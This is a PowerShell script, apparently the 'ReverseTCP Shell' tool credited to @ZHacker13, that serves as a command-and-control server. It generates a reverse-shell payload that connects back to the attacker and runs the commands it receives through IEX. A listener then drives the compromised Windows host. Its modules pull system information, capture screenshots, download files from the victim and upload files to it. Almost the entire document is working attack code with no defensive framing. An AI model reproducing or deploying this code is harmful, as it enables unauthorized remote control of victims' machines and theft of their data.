function Payload($IP,$Port,$Base64_Key)
{
  $Payload = "`$a=[System.Byte[]]::CreateInstance([System.Byte],1024);`$b=`#`;While(`$c=`$b.GetStream()){;While(`$c.DataAvailable -or `$d -eq `$a.count){;`$d=`$c.Read(`$a,0,`$a.length);`$e+=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$a,0,`$d)};If(`$e){;`$f=(IEX(`$e)2>&1|Out-String);If(!(`$f.length%`$a.count)){;`$f+=`" `"};`$g=([text.encoding]::ASCII).GetBytes(`$f);`$c.Write(`$g,0,`$g.length);`$c.Flush();`$e=`$Null};Start-Sleep -Milliseconds 1}";
  
  $C2 = "New-Object System.Net.Sockets.TCPClient('$IP',$Port)";
  $Payload = $Payload -replace "#","$C2";

  Return $Payload;
}

$Modules = @"


  _____                           _______ _____ _____      _____ _    _      _ _ 
 |  __ \                         |__   __/ ____|  __ \    / ____| |  | |    | | |
 | |__) |_____   _____ _ __ ___  ___| | | |    | |__) |  | (___ | |__| | ___| | |
 |  _  // _ \ \ / / _ \ '__/ __|/ _ \ | | |    |  ___/    \___ \|  __  |/ _ \ | |
 | | \ \  __/\ V /  __/ |  \__ \  __/ | | |____| |        ____) | |  | |  __/ | |
 |_|  \_\___| \_/ \___|_|  |___/\___|_|  \_____|_|       |_____/|_|  |_|\___|_|_|
                                                     
                                                                                     - By: @ZHacker13                                                                                                           

 - | Modules    | - Show C2-Server Modules.
 - | Info       | - Show Remote-Host Info.
 - | Upload     | - Upload File from Local-Host to Remote-Host.
 - | Download   | - Download File from Remote-Host to Local-Host.
 - | Screenshot | - Save Screenshot from Remote-Host to Local-Host.


"@;

Clear-Host;
Write-Host $Modules;

While(!($Local_Port))
{
  Write-Host " - Local Port: " -NoNewline;
  $Local_Port = Read-Host;

  netstat -na | Select-String LISTENING | % {
  
  If(($_.ToString().split(":")[1].split(" ")[0]) -eq "$Local_Port")
  {
    $Local_Port = $Null;
  }
 }
}

$Key = (1..32 | % {[byte](Get-Random -Minimum 0 -Maximum 255)});

Write-Host " [*] Please Wait ... [*]";

$Payload = Payload -IP $Local_Host -Port $Local_Port;

Write-Host " [*] Success ! [*]";

Clear-Host;
Write-Host $Modules;

Write-Host " - Local Port: $Local_Port";

$Bytes = [System.Byte[]]::CreateInstance([System.Byte],1024);
Write-Host "`n [*] Listening on Port `"$Local_Port`" [*]";
$Socket = New-Object System.Net.Sockets.TcpListener('0.0.0.0',$Local_Port);
$Socket.Start();
$Client = $Socket.AcceptTcpClient();
$Remote_Host = $Client.Client.RemoteEndPoint.Address.IPAddressToString;
Write-Host " [*] Connection ! `"$Remote_Host`" [*]";
Write-Host " [*] Please Wait ... [*]";
$Stream = $Client.GetStream();

$WaitData = $False;
$Info = $Null;

$System = "(Get-WmiObject Win32_OperatingSystem).Caption";
$Version = "(Get-WmiObject Win32_OperatingSystem).Version";
$Architecture = "(Get-WmiObject Win32_OperatingSystem).OSArchitecture";
$Name = "(Get-WmiObject Win32_OperatingSystem).CSName";
$WindowsDirectory = "(Get-WmiObject Win32_OperatingSystem).WindowsDirectory";

$Command = "`" - Host: `"+`"$Remote_Host`"+`"``n - System: `"+$System+`"``n - Version: `"+$Version+`"``n - Architecture: `"+$Architecture+`"``n - Name: `"+$Name+`"``n - WindowsDirectory: `"+$WindowsDirectory";

While($Client.Connected)
{
  If(!($WaitData))
  {
    If(!($Command))
    {
      Write-Host " - Command: " -NoNewline;
      $Command = Read-Host;
    }

    If($Command -eq "Modules")
    {
      Write-Host "`n$Modules";
      $Command = $Null;
    }

    If($Command -eq "Info")
    {
      Write-Host "`n$Info";
      $Command = $Null;
    }
    
    If($Command -eq "Screenshot")
    {
      $File = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_});
      Write-Host "`n - Screenshot File: $File.png";
      Write-Host "`n [*] Please Wait ... [*]";
      $Command = "`$1=`"`$env:temp\#`";Add-Type -AssemblyName System.Windows.Forms;`$2=New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);`$3=[System.Drawing.Graphics]::FromImage(`$2);`$3.CopyFromScreen((New-Object System.Drawing.Point(0,0)),(New-Object System.Drawing.Point(0,0)),`$2.Size);`$3.Dispose();`$2.Save(`"`$1`");If(([System.IO.File]::Exists(`"`$1`"))){[io.file]::ReadAllBytes(`"`$1`") -join ',';Start-Sleep -s 2;Remove-Item -Path `"`$1`" -Force}";
      $Command = $Command -replace "#","$File";
      $File = "$pwd\$File.png";
      $Save = $True;
    }

    If($Command -eq "Download")
    {
      Write-Host "`n - Download File: " -NoNewline;
      $File = Read-Host;

      If(!("$File" -like "* *") -and !([string]::IsNullOrEmpty($File)))
      {
        Write-Host "`n [*] Please Wait ... [*]";
        $Command = "`$1=`"#`";If(!(`"`$1`" -like `"*\*`") -and !(`"`$1`" -like `"*/*`")){`$1=`"`$pwd\`$1`"};If(([System.IO.File]::Exists(`"`$1`"))){[io.file]::ReadAllBytes(`"`$1`") -join ','}";
        $Command = $Command -replace "#","$File";
        $File = $File.Split('\')[-1];
        $File = $File.Split('/')[-1];
        $File = "$pwd\$File";
        $Save = $True;
      
      } Else {

        Write-Host "`n";
        $File = $Null;
        $Command = $Null;
      }
    }

    If($Command -eq "Upload")
    {
      Write-Host "`n - Upload File: " -NoNewline;
      $File = Read-Host;

      If(!("$File" -like "* *") -and !([string]::IsNullOrEmpty($File)))
      {
        Write-Host "`n [*] Please Wait ... [*]";

        If(!("$File" -like "*\*") -and !("$File" -like "*/*"))
        {
          $File = "$pwd\$File";
        }

        If(([System.IO.File]::Exists("$File")))
        {
          $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
          $FileBytes = "($FileBytes)";
          $File = $File.Split('\')[-1];
          $File = $File.Split('/')[-1];
          $Command = "`$1=`"`$pwd\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1 [*]`"}";
          $Command = $Command -replace "#","$File";
          $Command = $Command -replace "@","$FileBytes";
          $Upload = $True;

        } Else {

          Write-Host " [*] Failed ! [*]";
          Write-Host " [*] File Missing [*]`n";
          $Command = $Null;
        }

      } Else {

        Write-Host "`n";
        $Command = $Null;
      }

      $File = $Null;
    }

    If(!([string]::IsNullOrEmpty($Command)))
    {
      If(!($Command.length % $Bytes.count))
      {
        $Command += " ";
      }

      $SendByte = ([text.encoding]::ASCII).GetBytes($Command);

      Try {

        $Stream.Write($SendByte,0,$SendByte.length);
        $Stream.Flush();
      }

      Catch {

        Write-Host "`n [*] Connection Lost ! [*]`n";
        $Socket.Stop();
        $Client.Close();
        $Stream.Dispose();
        Exit;
      }

      $WaitData = $True;
    }

    If($Command -eq "Exit")
    {
      Write-Host "`n [*] Connection Lost ! [*]`n";
      $Socket.Stop();
      $Client.Close();
      $Stream.Dispose();
      Exit;
    }

    If($Command -eq "Clear" -or $Command -eq "Cls" -or $Command -eq "Clear-Host")
    {
      Clear-Host;
      Write-Host "`n$Modules";
    }

    $Command = $Null;
  }

  If($WaitData)
  {
    While(!($Stream.DataAvailable))
    {
      Start-Sleep -Milliseconds 1;
    }

    If($Stream.DataAvailable)
    {
      While($Stream.DataAvailable -or $Read -eq $Bytes.count)
      {
        Try {

          If(!($Stream.DataAvailable))
          {
            $Temp = 0;

            While(!($Stream.DataAvailable) -and $Temp -lt 1000)
            {
              Start-Sleep -Milliseconds 1;
              $Temp++;
            }

            If(!($Stream.DataAvailable))
            {
              Write-Host "`n [*] Connection Lost ! [*]`n";
              $Socket.Stop();
              $Client.Close();
              $Stream.Dispose();
              Exit;
            }
          }

          $Read = $Stream.Read($Bytes,0,$Bytes.length);
          $OutPut += (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0,$Read);
        }

        Catch {

          Write-Host "`n [*] Connection Lost ! [*]`n";
          $Socket.Stop();
          $Client.Close();
          $Stream.Dispose();
          Exit;
        }
      }

      If(!($Info))
      {
        $Info = "$OutPut";
      }

      If($OutPut -ne " " -and !($Save) -and !($Upload))
      {
        Write-Host "`n$OutPut";
      }

      If($Save)
      {
        If($OutPut -ne " ")
        {
          If(!([System.IO.File]::Exists("$File")))
          {
            $FileBytes = IEX("($OutPut)");
            [System.IO.File]::WriteAllBytes("$File",$FileBytes);
            Write-Host " [*] Success ! [*]";
            Write-Host " [*] File Saved: $File [*]`n";

          } Else {

            Write-Host " [*] Failed ! [*]";
            Write-Host " [*] File already Exists [*]`n";
          }
        }   Else {

            Write-Host " [*] Failed ! [*]";
            Write-Host " [*] File Missing [*]`n";
        }

        $File = $Null;
        $Save = $False;
      }

      If($Upload)
      {
        If($OutPut -ne " ")
        {
          $OutPut = $OutPut -replace "`n","";
          Write-Host " [*] Success ! [*]";
          Write-Host " [*] File Uploaded: $OutPut`n";

        } Else {
          
          Write-Host " [*] Failed ! [*]";
          Write-Host " [*] File already Exists [*]`n";
        }

        $Upload = $False;
      }

    $WaitData = $False;
    $Read = $Null;
    $OutPut = $Null;
  }
 }
}
